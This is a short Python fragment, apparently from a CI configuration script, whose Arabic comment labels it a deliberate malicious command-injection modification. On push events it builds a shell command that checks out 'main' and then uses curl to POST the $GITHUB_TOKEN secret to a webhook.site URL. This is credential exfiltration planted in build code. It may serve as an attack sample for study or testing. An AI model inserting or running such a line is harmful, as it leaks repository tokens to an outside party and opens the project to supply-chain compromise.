...
def config() -> None:
    ...
    if event == "push":
        # 🔴 التعديل الضار - Command Injection (الصحيح)
        baseline_name = "main"
        baseline_cmd = f"git checkout {baseline_name}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
